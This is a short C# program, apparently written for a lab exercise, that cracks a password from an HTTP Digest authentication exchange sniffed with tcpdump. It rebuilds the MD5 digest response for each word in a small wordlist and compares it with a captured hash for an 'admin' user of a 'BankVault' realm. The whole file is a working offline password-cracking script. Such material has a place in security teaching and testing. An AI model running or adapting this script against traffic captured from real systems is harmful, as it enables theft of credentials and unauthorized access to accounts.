using System.Security.Cryptography;
using System.Text;

class Program
{
    static void Main()
    {
        // ==========================================
        // 1. THE CAPTURED DATA (Fill from tcpdump)
        // ==========================================
        string USER = "admin";
        string REALM = "BankVault";
        string NONCE = "dcd98b7102dd2f0e8b11d0f600bfb0c093"; // The server's challenge
        string URI = "/vault";
        string METHOD = "GET";
        
        // These values come from the CLIENT'S response header you captured
        // Authorization: Digest username="admin", realm="BankVault", nonce="dcd98b7102dd2f0e8b11d0f600bfb0c093", uri="/vault", response="b4827f8ebec424eacb2d59c9da246b71">
        // Authorization: Digest username="admin", realm="BankVault", nonce="dcd98b7102dd2f0e8b11d0f600bfb0c093", uri="/vault", response="887c700efd74ac7e0a158bfda2ba5d0a">
        string CNONCE = "0aeac43dce393f0b"; // Example Client Nonce
        string NC = "00000005";     // Nonce Count
        string TARGET_RESPONSE = "b4827f8ebec424eacb2d59c9da246b71"; // The hash you are trying to crack        

        // ==========================================
        // 2. THE DICTIONARY (The guessing game)
        // ==========================================
        string[] wordlist = { "password", "123456", "monkey123", "letmein", "admin" };

        Console.WriteLine($"[*] Cracking Digest for user: {USER}...");

        foreach (var password in wordlist)
        {
            // A. HA1 = MD5(username:realm:password)
            string ha1 = CalculateMd5($"{USER}:{REALM}:{password}");

            // B. HA2 = MD5(method:uri)
            string ha2 = CalculateMd5($"{METHOD}:{URI}");

            // C. Response = MD5(HA1:nonce:nc:cnonce:qop:HA2)
            // Note: We assume qop="auth" as per the lab config
            string calculatedResponse = CalculateMd5($"{ha1}:{NONCE}:{NC}:{CNONCE}:auth:{ha2}");

            if (calculatedResponse == TARGET_RESPONSE)
            {
                Console.WriteLine($"[+] PASSWORD FOUND: {password}");
                return;
            }
        }

        Console.WriteLine("[-] Password not in list.");
    }

    // Helper: Standard MD5 Hex String generator
    static string CalculateMd5(string input)
    {
        using var md5 = MD5.Create();
        var bytes = md5.ComputeHash(Encoding.ASCII.GetBytes(input));
        return Convert.ToHexString(bytes).ToLower();
    }
}
